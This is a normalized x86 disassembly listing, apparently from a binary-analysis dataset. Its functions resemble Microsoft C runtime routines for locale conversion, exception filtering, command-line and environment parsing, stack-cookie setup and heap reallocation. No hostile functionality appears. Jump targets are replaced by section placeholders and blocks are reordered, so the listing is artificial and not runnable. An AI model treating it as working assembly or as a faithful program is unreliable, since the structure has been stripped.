mov [ edi + 0x70 ] eax
jmp r-xdata
push 0x1
push [ edi + 0x4 ]
lea eax [ ebp - 0x20c ]
push eax
push 0x7f
push r--data
push 0x1
push esi
call sub_4269ec
add esp 0x1c
test eax eax
je r-xdata
cmp eax 0x5
jne r-xdata
mov eax [ ebp - 0x2dc ]
mov [ eax ] 0x1
mov [ ebx + edi + 0x1c ] eax
jmp r-xdata
push [ ebx + edi + 0x1c ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c0 ]
mov [ ecx + 0x4 ] esi
mov eax esi
push [ ebx + edi + 0x1c ]
call sub_417912
push [ ebx + edi + 0x18 ]
call sub_417912
mov eax [ ebp - 0x2c4 ]
push [ eax ]
call sub_417912
mov eax [ ebp - 0x2c4 ]
mov [ ebx + edi + 0x14 ] esi
add esp 0xc
mov [ eax ] esi
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x20c ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x20c ]
push eax
call sub_41cf78
mov ecx [ ebp - 0x2c0 ]
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x2cc ]
mov [ ecx ] eax
sub_425b2a
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_4199d2
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0xa8 ]
test eax eax
jne r-xdata
mov edx 0x100
push 0x1
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp ax 0x19
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_41e9a9
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_42a58c
pop ecx
pop ecx
test eax eax
jne r-xdata
movzx eax cx
movzx eax ax
jmp r-xdata
add cx 0x20
movzx eax [ ebp - 0x4 ]
movzx eax [ ebp + 0x8 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ esi + 0x94 ]
movzx eax [ eax + ecx ]
movzx eax [ ebp + 0x8 ]
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
pop esi
je r-xdata
movzx eax ax
jmp r-xdata
movzx eax ax
jmp r-xdata
sub_425be4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_423368
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_425c33
push ebp
mov ebp esp
push esi
call sub_4246ee
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
add edi 0xc
and [ edi + eax - 0x4 ] 0x0
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_425d8e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov ebx rw-data
push ebx
xor eax eax
xor edi edi
push edi
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] ebx
test esi esi
je r-xdata
mov esi ebx
cmp [ esi ] di
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x8 ]
cmp eax 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push esi
call sub_425e3a
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea ecx [ eax + ebx * 2 ]
add ecx ecx
add eax eax
cmp ecx eax
jb r-xdata
push ecx
call sub_41b8d1
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_425e3a
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] eax
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_425e3a
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp + 0x8 ] 0x20
mov [ ebp - 0x4 ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ ebx ]
test edx edx
je r-xdata
xor eax eax
test edi edi
sete al
push 0x22
add ecx 0x2
mov edi eax
pop eax
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test edi edi
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp [ ecx ] ax
jne r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
pop edi
inc [ eax ]
pop esi
pop ebx
leave
retn
mov [ esi ] ebx
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x18 ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x8 ]
inc [ eax ]
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
inc ebx
push 0x22
pop eax
cmp [ ecx ] ax
push 0x5c
pop eax
jne r-xdata
test ebx ebx
jne r-xdata
test bl 0x1
jne r-xdata
dec ebx
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
shr ebx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
test edx edx
je r-xdata
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
xor eax eax
test esi esi
sete al
mov esi eax
push 0x22
pop edi
cmp [ ecx + 0x2 ] di
mov edi [ ebp + 0x18 ]
jne r-xdata
inc [ edi ]
xor ebx ebx
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
add ecx 0x2
xor ebx ebx
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
je r-xdata
push 0x5c
pop eax
push 0x5c
mov [ ebp - 0x8 ] 0x1
pop eax
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_425fc7
push ebx
push esi
mov esi [ rw-data ]
xor ebx ebx
push edi
mov edi ebx
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x3d
pop ecx
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax cx
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_41b887
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_41cd45
lea esi [ esi + eax * 2 ]
pop ecx
add esi 0x2
inc edi
mov esi [ rw-data ]
cmp [ esi ] bx
je r-xdata
push esi
call sub_417912
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
push esi
call sub_41cd45
pop ecx
push 0x3d
lea ebx [ eax + 0x1 ]
pop eax
cmp [ esi ] ax
je r-xdata
lea esi [ esi + ebx * 2 ]
xor ebx ebx
cmp [ esi ] bx
jne r-xdata
push 0x2
push ebx
call sub_41b887
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_417912
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_417a48
add esp 0xc
test eax eax
jne r-xdata
pop ecx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
add edi 0x4
sub_4260b6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_4260f6
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
xor ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
leave
retn
sub_426190
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
leave
retn
push ebx
xor ebx ebx
push esi
mov esi edi
cmp [ edi ] bx
je r-xdata
sub esi edi
add esi 0x2
push esi
call sub_41b8d1
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] bx
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
pop esi
mov eax ebx
pop ebx
push esi
push edi
push eax
call sub_41a1a0
mov ebx [ ebp - 0x4 ]
add esp 0xc
add esi 0x2
cmp [ esi ] bx
jne r-xdata
sub_4261eb
mov ecx [ rw-data ]
xor edx edx
test ecx ecx
jne r-xdata
push esi
push 0x20
pop esi
mov ecx r--data
cmp eax 0x22
jne r-xdata
test ax ax
je r-xdata
add ecx 0x2
jmp r-xdata
xor eax eax
test edx edx
sete al
mov edx eax
mov eax ecx
pop esi
retn
test edx edx
je r-xdata
movzx eax [ ecx ]
cmp ax si
ja r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
cmp ax si
ja r-xdata
add ecx 0x2
sub_426240
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_4290ac
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_4290ac
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_42628c
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
test eax eax
je r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_4199d2
mov eax [ ebp - 0x14 ]
test edi edi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
leave
retn
xor eax eax
mov [ edi ] ax
cmp [ eax + 0xa8 ] esi
jne r-xdata
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop ebx
push esi
push esi
or esi 0xffffffff
push esi
push ebx
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_41a7f0
pop ecx
push [ ebp + 0x10 ]
or esi 0xffffffff
push edi
push esi
push ebx
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] esi
jbe r-xdata
lea esi [ eax - 0x1 ]
call sub_41ccf1
mov [ eax ] 0x2a
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
movzx eax [ esi + ebx ]
mov [ edi ] ax
cmp [ esi + ebx ] 0x0
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_41ccf1
mov [ eax ] 0x2a
xor eax eax
mov [ edi ] ax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax ebx
jmp r-xdata
inc esi
add edi 0x2
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp + 0x8 ] eax
test ecx ecx
jne r-xdata
jmp r-xdata
dec ecx
mov [ ebp - 0x4 ] ecx
mov cl [ eax ]
test cl cl
je r-xdata
push [ ebp + 0x10 ]
sub eax ebx
push edi
push eax
mov eax [ ebp - 0x14 ]
push ebx
push 0x1
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
movzx eax cl
push eax
call sub_427df7
pop ecx
test eax eax
mov eax [ ebp + 0x8 ]
pop ecx
je r-xdata
mov esi eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
inc eax
inc eax
cmp [ eax ] 0x0
je r-xdata
sub_4263eb
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
test edi edi
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] ax
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
jmp r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
jmp r-xdata
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov eax ebx
cmp [ ebp + 0x18 ] ebx
ja r-xdata
mov [ eax ] esi
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
cmp eax 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0x14 ]
push edi
call sub_42628c
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
call sub_41ccf1
push 0x16
jmp r-xdata
inc eax
test edi edi
je r-xdata
test edi edi
je r-xdata
pop esi
mov [ eax ] esi
call sub_41f411
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
cmp eax ebx
jbe r-xdata
call sub_41ccf1
mov esi [ eax ]
jmp r-xdata
xor eax eax
mov [ edi ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ecx ] eax
xor ecx ecx
mov [ edi + eax * 2 - 0x2 ] cx
cmp [ ebp + 0x18 ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
push 0x50
mov eax ebx
pop esi
xor eax eax
mov [ edi ] ax
call sub_41ccf1
push 0x22
sub_4264e5
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] esi
test eax eax
je r-xdata
test edi edi
jne r-xdata
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
call sub_4199d2
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
test ecx ecx
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xa8 ] esi
jne r-xdata
cmp [ eax + 0xa8 ] esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push esi
push esi
push 0xffffffff
push edi
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ edi ]
test ax ax
je r-xdata
cmp [ eax + 0x74 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
call sub_41ccf1
mov [ eax ] 0x2a
or edi 0xffffffff
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov edi esi
jmp r-xdata
mov edx 0xff
lea edx [ ebp - 0x10 ]
push edx
push esi
push ebx
push ecx
push 0xffffffff
push edi
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test edi edi
je r-xdata
test ebx ebx
je r-xdata
mov edx 0xff
mov eax edi
mov ecx [ ebp - 0x24 ]
and [ ecx + 0x70 ] 0xfffffffd
lea edi [ eax - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add edi 0x2
inc esi
movzx eax [ edi ]
test ax ax
jne r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
push esi
push ebx
push ecx
push ebx
push edi
push esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax edi
mov edx ebx
call sub_41ccf1
mov [ eax ] 0x2a
or esi 0xffffffff
jmp r-xdata
mov al [ edi ]
mov [ ecx + esi ] al
mov ax [ edi ]
add edi 0x2
test ax ax
je r-xdata
cmp ax dx
ja r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea esi [ edi - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
test edx edx
je r-xdata
add eax 0x2
dec edx
jne r-xdata
inc esi
cmp esi ebx
jb r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + esi - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
cmp [ eax ] si
jne r-xdata
cmp [ eax ] si
je r-xdata
cmp [ edi ] dx
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
dec esi
jmp r-xdata
mov ebx eax
sub ebx edi
sar ebx 0x1
inc ebx
cmp [ ebp - 0x10 ] esi
jne r-xdata
test edx edx
js r-xdata
cmp edx 0x5
ja r-xdata
lea eax [ edx + edi ]
cmp eax ebx
ja r-xdata
mov eax esi
mov [ ebp - 0x1c ] eax
test edx edx
jle r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x2
mov [ ebp - 0x14 ] eax
cmp edi ebx
jb r-xdata
mov ecx [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp - 0x2c ]
push esi
push [ ecx + 0x74 ]
lea edx [ ebp - 0xc ]
push edx
push 0x1
push eax
push esi
push [ ecx + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov edx eax
test edx edx
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
inc eax
inc edi
mov [ ebp - 0x1c ] eax
cmp eax edx
jl r-xdata
mov al [ ebp + eax - 0xc ]
mov [ ecx + edi ] al
test al al
je r-xdata
sub_42674a
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
test esi esi
je r-xdata
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ esi ] al
pop edi
pop esi
leave
retn
mov eax edi
cmp [ ebp + 0x18 ] edi
ja r-xdata
mov [ ebx ] eax
cmp eax 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_4264e5
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
call sub_41ccf1
push 0x16
jmp r-xdata
inc eax
test esi esi
je r-xdata
test esi esi
je r-xdata
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp eax edi
jbe r-xdata
call sub_41ccf1
mov eax [ eax ]
jmp r-xdata
mov [ esi ] 0x0
pop ebx
mov eax ecx
mov [ ebx ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ebp + 0x18 ] 0xffffffff
je r-xdata
test ebx ebx
je r-xdata
push 0x50
mov eax edi
pop ecx
jmp r-xdata
mov [ esi ] 0x0
cmp edi eax
ja r-xdata
mov [ eax + esi - 0x1 ] 0x0
jmp r-xdata
call sub_41ccf1
push 0x22
sub_426813
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push [ ebp + 0x10 ]
call sub_4199d2
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_427df7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4269ec
add esp 0x1c
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4268c2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426ad5
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_41ccf1
test eax eax
je r-xdata
call sub_41ccf1
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_426900
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov ecx eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
leave
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_41cae0
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_419a5a
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
push eax
call sub_41794a
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_424c40
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_4269ec
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_426900
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_426a2a
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_41794a
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_417912
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_41ec44
pop ecx
call sub_41ccf1
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
